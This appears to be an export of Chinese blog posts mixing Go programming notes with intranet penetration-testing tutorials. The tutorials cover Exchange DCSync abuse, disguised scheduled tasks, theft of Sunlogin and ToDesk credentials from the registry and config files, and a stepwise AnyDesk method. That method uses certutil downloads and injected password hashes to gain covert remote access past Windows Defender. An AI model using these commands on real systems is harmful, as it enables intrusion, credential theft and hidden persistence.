[{"id":"c4760e8d502d7930d4cada9eeea4a021","title":"exchange渗透","content":"内网渗透exchange常见的名词：\nDN:\nCN:\nOU:\nDC:\nACE: 访问控制项，用于定义对资源的访问权限。ACE包含了用户、组、权限等信息，以及表示是否允许或拒绝访问。\nACL: 访问控制列表，是一种存储ACE的数据结构。ACL用于管理对某个资源的访问权限，可以包含多个ACE。每个ACE定义一个特定的的访问控制规则。\nDACL：自主访问控制列表。DACL定义了对于一个对象的访问权限，拥有WriteDACL的用户才能进行修改对象的DACL，既可以修改或者撤销用户或者用户组对该对象的访问控制权限。\n\nDCSYNC知识介绍在域环境中，不同的域控制器之间，每15分钟都会有一次数据同步。DC1向其他域控制器获取数据的时候，DC1会向DC2发起一个GetNCChanges的请求，该请求包括同步的数据（这里就有问题，如果我们需要同步的是域用户密码，就会获取到）\n当获取了域内管理员权限，如果能修改域内普通用户权限，让其具有DCsync权限的话，那么普通用户也能导出域内用户的哈希。可以做隐蔽的权限维持。\n默认情况下，只有域控制器主机账号和域管理员能够dcsync，域管和邮件服务器的机器账号能有写ACL的权限，可以给指定用户添加dcsync来dump域的哈希。\n域内用户只需要拥有以下的两个权限就有dcsync的权限\n‘DS-Replication-Get-Changes’     &#x3D; 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n‘DS-Replication-Get-Changes-All’ &#x3D; 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\n\n\n\n没有Exchange凭证\n除了默认的页面有登陆认证之外，如果我们需要爆破，还可以从这几个接口来进行爆破\n&#x2F;ecp,&#x2F;ews,&#x2F;oab,&#x2F;owa,&#x2F;rpc,&#x2F;api,&#x2F;mapi,&#x2F;powershell,&#x2F;autodiscover,&#x2F;Microsoft-Server-ActiveSync\n\n这里我们推荐使用工具\nhttps:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;EBurst\n\nrce漏洞（只需要普通用户凭证，不需要其他条件）CVE-2020-0688、CVE-2020-17144\n\n","slug":"exchange渗透","date":"2023-07-15T13:31:45.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"67ca9e91ec24db55ca87af66a3ba205d","title":"字节序列问题","content":"字节序的问题上次在内网穿透已经提到，字节序分为大端和小端，由于不同的芯片造成了不同的字节序列，例如X86是小端存储，System&#x2F;370，SPARC是大端存储，ARM是可以配置的。\n引入不同地区和不同地区的人之间是存在方言的，同一地区由于方言相同，就可以完全通信，但是如果要不同地区之间的人进行通信，由于方言不同，导致你听不懂我的，我听不懂你的，就导致了一系列的问题。所以的话，普通话就出现了，普通话的出现就解决了不同地区之间的沟通问题，那么网络字节序列和主机字节序列也是如此。\n网络字节序列和主机字节序列前面的大端和小端都是在说计算机本身，称为主机字节序列，是自己电脑上的问题，如果自己给自己发送，当然没有任何问题，那么如果在网络中进行发送和读取，如果发送方和你的字节序列是不一致的，那么读取到的内容也会出现问题，所以在网络发送过程中，TCP&#x2F;IP规定，必须使用大端序列来进行发送。（也就是计算机和计算机之间说普通话），接受到数据之后，再转换为自己的字节序列来进行存储，完全可以实现通信。但是需要自定义大小端的来进行发送。\ntcp粘包问题造成的原因：tcp是流传输，默认采用nagle算法，合并较小的数据包，再发送。所以数据发送出来的时候就已经是粘包状态。但是接收方并不知道发送方合并数据包，而且数据包在TCP中是没有分界的，所以就导致了粘包问题。\n解决粘包问题：网络编程中的TLV规范TLV是通信协议的一种约束。例如TCP、UDP都是通信协议，但是上述的协议是不可以改变的，但是在处理实际的业务的过程中，我们的端到端通信的数据是不确定的，我们希望自定义通信协议然后到对方进行解析。TLV便是一种用户自定义的通信协议。\n数据的类型Tag（T）\t                     2字节 or 4字节\n数据的长度Length（L）\t                 2字节 or 4字节\n数据的值Value（V）\t                    由length指定\n\n如下图。\n +----+-----+---------+\n|type| len | content |\n+----+---------------+\n| 4  |  4  |   ...   |\n+----+---------------+\n\n字节序列问题双方在自定义协议的时候需要统一数据格式和大小端\n","slug":"字节序列问题","date":"2023-06-19T02:20:29.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"6f6e74f284af1d44cd531a6b40059037","title":"内网穿透","content":"内网穿透在内网渗透的过程中，内网穿透是相当重要的，可以把内网中的流量代理出来，也可以把内网的某个端口映射出来，那么今天就先讲解一下内网穿透的具体原理。\n内网穿透（端口映射）的原理引入在内网穿透过程中，通常你在服务器端 监听服务器端口，然后客户端连接内网机器连接服务器的某个端口，你在访问服务器的映射端口就能访问，如下图。\n\n那么他们到底是如何进行了端口之间的映射转换，肉鸡的端口如何来进行连接，到底经过了内部什么转换，仅限于使用者的话，是不能得知的。\n端口映射的原理介绍在端口映射过程中，通常是这样的。如下图\n\n整个流程是：\n（1）内网客户端连接8088端口，8088端口“告诉”9998端口你需要开始监听，让人连接，这里9998端口开始监听\n（2）内网客户端再连接9998端口，9998端口负责将9999端口监听到的内容发送到内网客户端（中继的作用）\n（3）客户（右下客户端）连接9999端口，负责进行请求\n\n各个部分的作用\n（1）服务端的8088端口： 负责进行内网的通信，检测客户端是否存活\n（2）服务端的9998端口：负责用户和内网之间的传递\n\n\n\n端口映射代码编写过程中的一些问题（这里其实不是端口映射其实是反向代理）这里介绍一下在TCP编程的时候，何时使用字节序列存储。\n如果服务端对数据进行解析、修改、转换。例如：提取特定的字段，修改数据的内容等就需要使用字节序列来进行操作。\n\n\n\n大端存储和小端存储不同的PC之间是用着可能不同的存储方式，这里需要理解大端存储和小端存储之前就需要先了解高地址和低地址、数据的高位和低位。\n数据的高位和低位数据的高位就是左边的数、数据的低位就是右边的数。数据的高位和低位又称为高字节和低字节。\n\n如上图，1就相对于4是高位，4就相对于1时低位。\n高地址和低地址为了便于管理存储地址，需要给地址进行编号，值较大的是高地址，值较小的是低地址。通常拿16进制来表示地址，0X00是低地址、0XFF是高地址。\n\n大端存储和小端存储大端存储：是将数据的低位字节放在高地址处，高位字节放到低地址。\n小端存储：是将数据的高位字节放在高地址，低位字节放在低地址。\n\n\n说明：而内网穿透和其他的C&#x2F;S模式的服务器，因为不知道C和S具体是什么存储方式，所以在进行数据传递的时候，需要进行指定存储方式来进行读取或者传输。 这里又称为序列化和反序列化的过程。将二进制数据转换为数据类型就叫反序列化，将数据转换为二进制就称为序列化。\n这里需要知道一个前提：0x01020304 &lt;&#x3D;&#x3D;&gt; []byte{0x01, 0x02, 0x03, 0x04}\n（1）在TCP&#x2F;IP协议规定，网络数据应采用大端字节序来进行传输\n（2）不管这台主机是大端机还是小端机，都会按照这个TCP&#x2F;IP规定的网络字节序来进行发送或者接受数据\n（3）如果当前主机是大端序，就需要先转换为大端序来，否则就忽略。直接发送即可。\n\n\n\n传输过程中的常见基础知识字节（byte）和比特（bit）的介绍比特（bit）是二进制位的简称，一个二进制（0&#x2F;1）就是一个bit，bit在计算机内部存储过程中是最小的存储单元。\n\n字节Byte是计算机处理的最小的单位，习惯使用大写B来进行表示。每个字节有8个二进制位，所以字节和bit之间的转换关系是\n字节于bit之间的转换关系： 1字节&#x3D;8bit\n","slug":"内网穿透","date":"2023-06-13T03:17:59.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"1208573faa087b8bddb01ba640107299","title":"设计模型","content":"设计模式设计模式主要为提高代码的可读性、提高代码复用程度来进行的。\n23种设计模式设计模式的设计理念这里的设计模式设计理念很多，比如开闭原则、单一职责原则、依赖倒转原则、合成复用原则等。这里基于几个重要的原则来进行详细的说明。\n开闭原则简单来说就是一个功能点的实现不是靠修改代码来实现的，而是靠增加代码来实现的。\n个人理解：\n   简单来说就是设计出来代码之后，如果要增加代码，尽量不修改原来的代码，而是在原来的代码上增加代码\n\n开闭原则理解：假设这里有一个demo，定义了一个Banker类，进行了Save、Transform、Pay的三种方法\ntype Banker struct&#123;&#125;\n\nfunc (b *Banker) Save() &#123;\n\tfmt.Println(\"进行了存款业务\")\n&#125;\nfunc (b *Banker) Transform() &#123;\n\tfmt.Println(\"进行了转账业务\")\n&#125;\nfunc (b *Banker) Pay() &#123;\n\tfmt.Println(\"进行了支付业务\")\n&#125;\n\n如果要给Banker增加一个方法，那么我们应该如何去做呢？？？\n如果在上面的代码中增加一个股票的业务，这里我们可以直接写入\nfunc (b *Banker) Shares() &#123;\n\tfmt.Println(&quot;进行了股票业务&quot;)\n&#125;\n\n这里的业务是较为简单的，如果业务较为复杂，你修改原有的类，就显得较为困难，那么我们应该去正确的编写代码呢？？？？\n这里官方给出的解决方法：\n我们可以把Banker进行抽象，编写一个抽象的Banker，然后进行分类，我们可以继承并且实现抽象的Banker后进行Save方法\n\n有点类似于，Banker进行了细节划分，如下图，细化分为了SaveBanker、PayBanker、TransformBanker\n\n\n官方代码实现如下：/*\n这里定义了一个抽象的Banker接口，定义了DoSomeThing的方法\n*/\ntype AbstractBanker interface &#123;\n\tDoSomeThing()\n&#125;\n/*\n这里实现了抽象Banker接口，并且做了自己的事情\n*/\ntype SaveAbstractBanker struct&#123;&#125;\n\nfunc (SB *SaveAbstractBanker) DoSomeThing() &#123;\n\tfmt.Println(\"Save running....\")\n&#125;\n....\n....\n....\n....\n\n官方代码实现的一些弊端：  开闭原则如果用官方实现的话，我们就会发现一些问题\n（1）如果各个Banker需要做的事情不同（这里指的是Save和Pay）中的方法中的形参不同，就会导致interface接口中定义很多类方法，如果面向抽象接口来进行编程的话，要实现多态就会较为复杂。\n\n\n\n个人想法：我们既然可以用接口来完成，那么我们也可以用“类”来进行完成。我们可以定义一个基类BaseBanker，然后实现基类必须实现的方法，然后去子类去实现基类，自定义方法去实现。\ntype BaseBanker struct &#123;\n\t/*\n\t\t属性1\n\t\t....\n\t*/\n&#125;\nfunc (bb *BaseBanker) Pay() &#123;\n\tfmt.Println(\"进行一个支付业务\")\n&#125;\n/*\n下面的SaveBanker继承了BaseBanker 并且有自己的Save方法\n*/\ntype SaveBanker struct &#123;\n\tBaseBanker\n\t/*\n\t\tSaveBanker自定义的一些属性\n\t*/\n&#125;\nfunc (SB *SaveBanker) Save() &#123;\n\tfmt.Println(\"进行了一个存储业务\")\n&#125;\n\n个人想法的一些缺点和适用情况（1）不符合面向接口编程\n（2）如果类太多，就会导致继承比较复杂\n\n\n适用情况：\n   各个类之间的函数参数不定，如果使用接口实现较为复杂\n\n这里个人还是建议，能面向接口编程，一定要面向接口编程。\n依赖倒转原则编写代码时，要依赖于接口，不要依赖于具体的实现，面向接口编程 给代码分层，接口层，实现层，逻辑层。\n例如，有以下的几种情况。\n（1）张三开宝马，如何编写代码\n（2）李四开奔驰，如何编写代码\n（3）张三开奥迪或者其他车，李四开奥迪或者其他车，又应该如何编写\n\n我们可以去定义两个接口，一个person接口，一个car接口\ntype Car interface &#123;\n\tRun()\n&#125;\ntype Person interface &#123;\n\tDrive(car Car)\n&#125;\n\n之后的话，我们可以实现这两个接口\ntype Zhangsan struct&#123;&#125;\n\nfunc (zs *Zhangsan) Drive(car Car) &#123;\n\tcar.Run()\n&#125;\n\ntype Benchi struct&#123;&#125;\n\nfunc (bc *Benchi) Run() &#123;\n\tfmt.Println(\"奔驰.....\")\n&#125;\n\n然后我们就可以用代码来进行逻辑上的操作。\nfunc main() &#123;\n\tvar a Person = &amp;Zhangsan&#123;&#125;\n\ta.Drive(&amp;Benchi&#123;&#125;)\n&#125;\n\n\n合成复用原则：当我们用继承和组合都可以解决问题的时候，优先使用组合的方式来解决。 （因为：当我们使用继承的方式去解决的时候，如果父类中的某个方法要改变，子类也会受到影响，除非重写父类方法）\n详细说明组合：type catc struct &#123;\n\tcat *cat\n&#125;\n\nfunc (cc *catc) eat() &#123;\n\tcc.cat.eat()\n&#125;\n\n以上的代码就是采用组合的方式而非继承的关系。\n工厂三兄弟工厂模式的介绍如果业务层直接和基础类模块进行交互的话，那么就违背了单一职责原则，一个类即需要进行类的本身操作又需要进行实例化。所以我们在业务层和基础类模块之间增加了一层 工厂，业务层不必关心基础模块的具体实现，只需要和工厂进行交互即可，工厂负责基础模块的创建和其他繁杂的逻辑。\n工厂三兄弟为简单工厂模式、工厂模式、抽象工厂模式\n简单工厂模式中心思想：\n（1）面向接口编程\n（2）把众多的基础类进行抽象，在创建的时候调用接口来进行创建。\n（3）没有把工厂进行抽象化\n\n弊端：（1）违反了开闭原则\n工厂模式：简单工厂模式+开闭原则&#x3D;工厂模式\n简单工厂模式是把基层类进行了抽象化，没有把工厂进行抽象化，所以进行开闭原则的基础就是把工厂也进行抽象化，定义一个抽象工厂，然后实现的时候有苹果类的苹果厂、香蕉类的香蕉厂、梨类的梨厂。每个对应的工厂就对应到每个基层类生成中去。\n具体实现：type Fruit interface &#123;\n\tShow()\n&#125;\ntype AbstractFactory interface &#123;\n\tCreateFruit() Fruit\n&#125;\n\n上面定义了两个抽象接口，这里分别是水果接口和梨接口\n下面的苹果、香蕉、梨都实现了这些水果接口\ntype Apple struct&#123;&#125;\n\nfunc (apple *Apple) Show() &#123;\n\tfmt.Println(\"苹果show\")\n&#125;\n\ntype Banana struct&#123;&#125;\n\nfunc (Bn *Banana) Show() &#123;\n\tfmt.Println(\"香蕉show\")\n&#125;\n\ntype Pear struct&#123;&#125;\n\nfunc (pear *Pear) Show() &#123;\n\tfmt.Println(\"梨show\")\n&#125;\n\n下面的苹果工厂实现了工厂的接口\ntype AppleFactory struct&#123;&#125;\n\nfunc (af *AppleFactory) CreateFruit() Fruit &#123;\n\treturn &amp;Apple&#123;&#125;\n&#125;\n\n\n\n注册表设计模式例如现在有各种各样的服务，每个服务有不同的操作，那么我们如果现在传入一个服务，那么正常代码肯定会进行if-else循环，所以我们注册表就是为了解决这种多个if-else循环的问题.\nvar (\n\tonce     sync.Once\n\tregister *Registry\n)\n\ntype Registry struct &#123;\n\t&#x2F;*\n\t\t其实services中存入的就是一个服务和一个new函数\n\t*&#x2F;\n\tservices map[string]func() service\n&#125;\n\nmap集合中存放的就是一个map[service]new函数，如下的这种\nmap[ssh] &#x3D; NewSsh()\n\n单例设计模式单例设计模式不应该被单独来讲，通常是和其他设计模式来进行使用，或者是线程池，数据库连接池。日志记录器等\n注册表模式的问题注册表我们如果每个都new一个新注册表出来的话，地址不一样，所以无法实现注册，我们的思路是，使用单例模式来配合注册表模式来进行设计。\n注册表模式会遇到一种方式 注册表的New函数接收参数和返回类型都是接口类型，但是返回的类型是不一样的，比如实现了接口的ftp、mysql等。这个时候，我们应该如何去操作\n\n\n\n\n\ngolang的代理设计模式其实和java中的代理类似，代理模式其实就是代理模式。\n\n有点类似于简单工厂设计模式，我们中介其实就直接进行了实例化出来，是个结构体，这种适用场景是很多物品都实现了同样的几个属性，中介仅仅是在实现的基础上进行了加强。\n","slug":"设计模型","date":"2023-06-12T07:24:39.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"35e4bdf3cccf47af2799cbeef79306c1","title":"生产者消费者问题","content":"什么是生产者消费者问题？（引入）  系统中只有一组生产者和消费者，生产者每次生产一个产品放到缓冲区中，消费者进行每次对缓冲区取一个进程并使用，他们之间的关系就像大学宿舍带饭一样，你把钱给了室友，室友拿着你的钱给你买来了饭。那么传输介质钱就相当于缓冲区。\n  如果一元为最基本单位，如果你想买一个棒棒糖，那么最基本的一块钱就可以买到。所以你就可以给你室友一块钱来进行购买。\n  那么现在又有了一个新的问题，如果你想买的东西不是一块钱，你给你室友多少钱，你室友才能帮你买到饭，那么意思就是，你给的钱不够，室友不能帮你买到想要的饭，你给的钱太多，室友就赚了一部分钱（并不想发生），所以这里就需要设置合理的缓冲区。\n  上面的这个东西可以进行抽象为生产者和消费者的单缓冲问题和多缓冲问题，在单缓冲问题中（上述买棒棒糖），我们只需要给一个最基本单位就可以，所以缓冲区大小为1，那么在多缓冲区问题中，我们一个最基本单位肯定不足以去支撑，所以我们就需要进行一个缓冲区大小的合理选择。\n  只有缓冲区大小满了（这里假设合理即满），消费者才能去消费（室友才能去帮你买饭），那么我们需要做的事情就是放入到一块钱到盘子中，而室友需要做的是把一块钱从盘子中取出来，那么在我们放之前的动作，室友都是在进行等待我们往盘子中放入东西。\n生产者消费者问题  生产者和消费者共享一个初始化为空，大小为n的缓冲区。\n缓冲区没满，生产者生产并放入缓冲区中，否则进行阻塞（缓冲区没满--&gt;生产者生产）\n缓冲区中不为空，消费者读取，否则进行等待。（缓冲区不为空--&gt;消费者消费）\n\nP、V操作P：缓冲区是否有空位，若有则空位-1，若无，则处于阻塞状态\nV：（空位+1）\n\n\n\n这里的生产者消费者问题可以抽象到golang中进行进程间通信。\n例如：\n这里有如下的问题，起两个进程，第一个进程输出0-10，第二个进程输出第一个进程输出数字的二倍。例如122436.\n\n那么的话，我们是否可以用生产者消费者问题中的单缓冲区来进行实现？\n思路：\n （1）创建一个缓冲区（盘子）\n （2）第一个线程输出后，把数字放到单缓冲区中，然后进行监听单缓冲区是否有数据输入\n （3）第二个线程一直监听单缓冲区，如果有数据输入，则进行读出，读出后进行*2操作\n （4）运算结束后，向单缓冲区中放入数据，代表线程2完成操作\n （5）线程1收到后，继续2-4过程，直到运算结束\n\n\ngolang的代码实现：\n这里可以把操作系统中的生产者消费者问题进行再抽象，例如P、V操作是检测缓冲区是否有空位。\nThread2这里起一个线程来进行读取线程中的数据，直到关闭管道。\nThread1这里就是输出一个数之后，向缓冲区中进行写入，Thread2拿到缓冲区数据后，然后执行计算，输出后，向缓冲区写入，然后再执行此操作\n这里抽象成如下的图\n\n\n如上图，其实就是一个简单的流程图，知道bufferchan不关闭就一直处于阻塞状态。\n利用channel管道实现进程间通信package main\n\nimport (\n\t&quot;fmt&quot;\n\t&quot;sync&quot;\n)\n\nvar bufferchan &#x3D; make(chan int, 1)\nvar wg &#x3D; &amp;sync.WaitGroup&#123;&#125;\n\nfunc Thread1() &#123;\n\tdefer wg.Done()\n\tcount :&#x3D; 10\n\tfor i :&#x3D; 0; i &lt; count; i++ &#123;\n\t\tfmt.Printf(&quot;Thread 1 value: %v\\n&quot;, i)\n\t\tbufferchan &lt;- i\n\t\t&lt;-bufferchan\n\t&#125;\n\tclose(bufferchan)\n&#125;\nfunc Thread2() &#123;\n\tdefer wg.Done()\n\tfor &#123;\n\t\tselect &#123;\n\t\tcase value, ok :&#x3D; &lt;-bufferchan:\n\t\t\tif !ok &#123;\n\t\t\t\tgoto EXIT\n\t\t\t&#125; else &#123;\n\t\t\t\tfmt.Printf(&quot;Thread 2 value: %v\\n&quot;, value*2)\n\t\t\t\tbufferchan &lt;- 1\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\nEXIT:\n\tfmt.Println(&quot;done&quot;)\n&#125;\nfunc main() &#123;\n\twg.Add(2)\n\tgo Thread1()\n\tgo Thread2()\n\twg.Wait()\n&#125;\n\n\n生产者消费者引出的进程间通信的问题在学习操作系统的时候肯定接触过生产者消费者引出的线程间通信导致的读多写少或者是读少写多的问题\n\n  大家可以设想一下现在我们的内存里有一个ArrayList，这个ArrayList默认情况下肯定是线程不安全的，要是多个线程并发读和写这个ArrayList可能会有问题。\nGolang代码实现操作系统 内存读写问题package main\n\nimport (\n\t&quot;fmt&quot;\n\t&quot;sync&quot;\n)\n\nvar i &#x3D; 0\n\nvar wg &#x3D; &amp;sync.WaitGroup&#123;&#125;\nvar bufferchan &#x3D; make(chan int, 100)\n\nfunc Count(v int) &#123;\n\ti &#x3D; i + v\n&#125;\nfunc work(Thread int) &#123;\n\tdefer wg.Done()\n\tfor v :&#x3D; range bufferchan &#123;\n\t\tfmt.Printf(&quot;Thread: %v\\n&quot;, Thread)\n\t\tCount(v)\n\t&#125;\n&#125;\nfunc storeBuffer() &#123;\n\tdefer wg.Done()\n\tcount :&#x3D; 100\n\tfor g :&#x3D; 0; g &lt; count; g++ &#123;\n\t\tbufferchan &lt;- g\n\t&#125;\n\tclose(bufferchan)\n&#125;\n\nfunc main() &#123;\n\twg.Add(1)\n\tgo storeBuffer()\n\tfor worker :&#x3D; 0; worker &lt; 10; worker++ &#123;\n\t\twg.Add(1)\n\t\tgo work(worker)\n\t&#125;\n\twg.Wait()\n\tfmt.Printf(&quot;i: %v\\n&quot;, i)\n&#125;\n\n\ngolang协程读写问题的解决方式（1）加锁  这里的两个值是不一样就是因为脏写的原因，如果要让他们变得一样，那么就得需要操作系统中学到的加锁来实现。即该操作，只能让一个协程来进行，其他协程均处于阻塞状态。\nvar m &#x3D; &amp;sync.Mutex&#123;&#125;\nfunc Count(v int) &#123;\n\tm.Lock() &#x2F;&#x2F;枷锁\n\ti &#x3D; i + v\n\tm.Unlock()\n&#125;\n\n（2）用channel管道  那么加锁可以实现的话，是否也可以用管道来进行实现阻塞呢，我们可以定义一个单缓冲管道flagchan。也可以用来进行实现\nvar flagchan &#x3D; make(chan bool, 1)\nfunc Count(v int) &#123;\n\tflagchan &lt;- true\n\ti &#x3D; i + v\n\t&lt;-flagchan\n&#125;\n","slug":"生产者消费者问题","date":"2023-06-07T15:11:37.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"c4556658ea93de4cdb9b9ffeed31a388","title":"内网渗透命令详解","content":"计划任务（schtasks）&#x2F;create: 创建新的计划任务。如果任务存在，则会显示错误信息。\n&#x2F;delete: 删除现有的计划任务。\n&#x2F;query: 列举现有的计划任务。\n&#x2F;change: 改变现有的计划任务。\n&#x2F;Run: 立即运行计划任务。\n&#x2F;End: 停止正在运行的计划任务。\n&#x2F;Tn taskname: 指定要管理的计划任务的名称。\n&#x2F;RU username: 指定要运行计划任务的用户。这个用户必须是本地用户或域用户。\n&#x2F;RP password: 指定要用于运行计划任务的用户密码。\n&#x2F;SC schedule: 指定计划任务执行的时间表。可用的选项有MINUTE、HOURLY、DAILY、WEEKLY\n&#x2F;ST starttime:指定计划任务开始执行的时间\n&#x2F;SD startdate：指定计划任务的开始日期。\n&#x2F;ET endtime：指定计划任务结束执行的时间。\n&#x2F;ED enddate：指定计划任务结束执行的日期。\n&#x2F;TR taskrun：指定要在计划任务上运行的程序或命令。\n\nschtasks &#x2F;create &#x2F;tn &quot;windows_security&quot; &#x2F;SC DALITY &#x2F;TR &quot;C:\\windows\\1.txt&quot; &#x2F;RU Administrator\n\n（1）创建一个计划任务 \n（2）名字是windows_security \n（3）每天启动一次\n（4）运行C:\\windows\\1.txt\n（5）运行用户是Administrator\n\n\n\ndir命令语法格式：\ndir [drive:][path][filename] [&#x2F;A[[:]attributes]] [&#x2F;B] [&#x2F;C] [&#x2F;D[:date]] [&#x2F;L] [&#x2F;N] [&#x2F;O[[:]sortorder]] [&#x2F;P] [&#x2F;Q] [&#x2F;R] [&#x2F;S] [&#x2F;T[[:]timefield]] [&#x2F;W] [&#x2F;X] [&#x2F;4]\n\n这里介绍几个常用的\n&#x2F;A：指定要列出的文件属性\n&#x2F;B：以简易的格式列出文件名\n&#x2F;Q：显示文件所有者是谁\n&#x2F;S：递归子目录下所有文件\n\n如果在后渗透阶段，拿到了用户权限非管理员，这里就可以使用dir命令来查看当前用户有哪些文件管理权限\ndir &#x2F;s &#x2F;q | findstr &quot;Q16G&quot; &#x2F;&#x2F;查看当前目录以及子目录下属于Q16G的文件有哪些\n\n\n\n","slug":"内网渗透命令详解","date":"2023-05-29T13:54:05.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"cc6d2d872c17e9f57d00d14d5f5b2ba7","title":"内网远程控制总结","content":"前言在内网渗透过程中，会碰到远程控制soft或者其他，这里针对远程控制软件做如下总结。\n远程控制软件向日葵篇向日葵查看版本向日葵（可以攻击）针对向日葵的话其实如果有本地安装的话，是有可能存在漏洞的。这里进行复现\n向日葵个人版for Windows &lt;&#x3D; 11.0.0.33\n向日葵简约版 &lt;&#x3D; V1.0.1.43315（2021.12）\n测试客户端漏洞版本:11.0.0.33162\n\n攻击过程：\n（1）tasklist 查看是否有sunlogin的进程\n（2）直接用golang的工具来进行攻击即可\n\nhttps:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce\n\n向日葵（不可以攻击）遇到不可以攻击的向日葵，我们也有几种渗透手法：\n（1）窃取配置文件来进行解密（低版本 版本号具体未知）低版本的向日葵把密码和机器码加密写入到了配置文件中，我们可以把配置文件down到自己的机器上，然后进行重开向日葵即可。这里向日葵版本较低，就不进行测试\n（2）在12.5.2之前的某些版本可以写到了注册表中，所以可以使用注册表来进行查询reg query HKEY\\_USERS\\\\.DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginInfo  \nreg query HKEY\\_USERS\\\\.DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginGreenInfo  \n\n向日葵默认配置文件路径:  \n安装版：C:\\\\Program Files\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\config.ini  \n便携版：C:\\\\ProgramData\\\\Oray\\\\SunloginClient\\\\config.ini  \n本机验证码参数：encry\\_pwd  \n本机识别码参数：fastcode(去掉开头字母)  \nsunlogincode：判断用户是否登录状态\n\n\n\n在向日葵高于 12.5.3.* 的机器中已经没有办法获取secert了\n\ntodesk篇常见渗透方式（偷配置，百试百灵）这里还是和前面的向日葵一样，可以进行配置文件的窃取，这里的默认安装路径（C:\\Program Files\\ToDesk\\config.ini）\n\n这里咱们可以攻击机安装todesk，然后读取到config.ini中的配置文件，然后和攻击机进行替换即可。这里我虚拟机假装是受害机，读取出来，然后攻击机把tempauthpassex进行替换。\n\n本机下载todesk进行替换。\n\n两个机器密码相同（进行替换的时候需要修改攻击机密码更新频率）\n\n\nanydeskanydesk的配置文件在 C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk   文件中\n\n而通常这个时候我们有权限修改anydesk的配置文件，这里进行测试，起两个虚拟机，设定一个场景（攻击机拿到了webshell，受害机开着windows defender，如何去渗透拿到受害机权限）\n攻击机 ip: 10.211.55.3 + 10.211.55.2\n受害机 ip: 10.211.55.4（windows defender全开）\n\n情景复现这里拿到了受害机的webshell，是个普通权限，无法去关闭\n\n这里可以看到有windows defender来运行，这里无法进行关闭windows defender，\n\n这里用powershell来执行远程命令下载anydesk到用户的目录中去,因为虚拟机只有C盘，所以我创建了一个目录来进行存放，在真实的渗透过程中，一般是有RWE的目录\n可以用任意一种方式来放进去，只要放进去就有，这里列举一种方式\n这里列举一种（也可以有权限之后，直接拖入上传）\ncertutil -urlcache -split -f https:&#x2F;&#x2F;download.anydesk.com&#x2F;AnyDesk.exe C:&#x2F;tmp&#x2F;anydesk.exe\n\n\n上传上去之后，先不去打开。转到攻击机进行操作\n  （1）这里先去给攻击机下载anydesk（如果下载过的小伙伴，要先清除） C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk中的配置，没有的就不用看这一步，清除结束后如下\n\n（2）这里打开攻击机的anydesk，牢记我此处勾选的id，然后点击右上角的概述–&gt;为自主访问设置密码–&gt;设置一个密码（这里设置为Q16G666!!）—&gt;之后点击应用，攻击机完全退出anydesk（小托盘也要退出），并且退出时不选择安装anydesk\n\n（3）攻击机完全退出anydesk（小托盘也要退出），这里还是到配置文件下 C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk，然后把文件复制下来。是我图中勾选的这四个。复制完成之后，攻击机将文件进行删除。\n\n复制下来之后，给受害机的当前用户（拿到权限的用户）找到anydesk配置文件路径并且复制到其他（如果没有配置文件路径则进行创建配置文件路径），一定要注意这里攻击机复制完之后，一定要将攻击机中的配置文件进行删除\n（4）重新打开攻击机，生成配置文件，启动受害机的anydesk。\n\n（5）用攻击机进行连接，这里连接的id就是（2）中截图的id，密码就是（2）中设置的密码即可成功无感绕过windows defender\n情景复现2 （计划任务）（1）确定用户创建计划任务如果命令行不能去执行，则可以去创建计划任务去执行，例如，必须先确定当前用户，在当前用户的目录下执行anydesk，\npowershell &quot;(((Get-WmiObject -Class Win32_Process -Filter &#39;Name&#x3D;\\&quot;explorer.exe\\&quot;&#39;).GetOwner().user) -split &#39;\\n&#39;)[0]\n\nschtasks &#x2F;Create &#x2F;TN Windows_Security_Update &#x2F;SC monthly &#x2F;tr &quot;C:\\Users\\testuser.G1TS\\Desktop\\anydesk.exe&quot; &#x2F;RU 用户名\n\n执行计划任务\nschtasks &#x2F;run &#x2F;tn Windows_Security_Update\n\n后续步骤和上面相同\n\n然后添加密码到配置文件中去（密码为AnyDeskGetAccess）\necho ad.anynet.pwd_hash&#x3D;85352d14ed8d515103f6af88dd68db7573a37ae0f9c9d2952c3a63a8220a501c &gt;&gt; C:\\Users\\用户目录\\AppData\\Roaming\\AnyDesk\\service.conf\necho ad.anynet.pwd_salt&#x3D;cb65156829a1d5a7281bfe8f6c98734a &gt;&gt; C:\\Users\\用户目录\\AppData\\Roaming\\AnyDesk\\service.conf\n\n然后查看用户的id\ntype C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk\\system.conf\n\n连接即可\n优点：整个过程都不需要进行UAC弹窗，真正实现了无感绕过\n缺点：（1）会弹出anydesk的界面，导致一些问题\n（2）启动anydesk的权限需要桌面用户权限，比如，IIS做了中间件环境，拿到的webshell一般都是没有桌面用户权限，如果启动anydesk是不会成功的。\ngotohttpgotohttp在我的渗透测试过程中，是一个常见的方式，给我的感觉，即用即连，浏览器连接，方便快捷。但是缺点就是权限划分明确，普通用户权限起的gotohttp无法进行管理员权限操作，比如关闭windows defender和其他一些行为，不过在规避杀软这儿也有奇效。\n复现过程普通用户上去之后只能用普通用户权限（这里下载对应的gotohttp *https://gotohttp.com/*），上传上去，命令行运行他，直接在当前目录下生成配置文件，读取配置文件，即可成功连接\n\n\n因为是普通用户启动的，这里如果尝试关闭windows 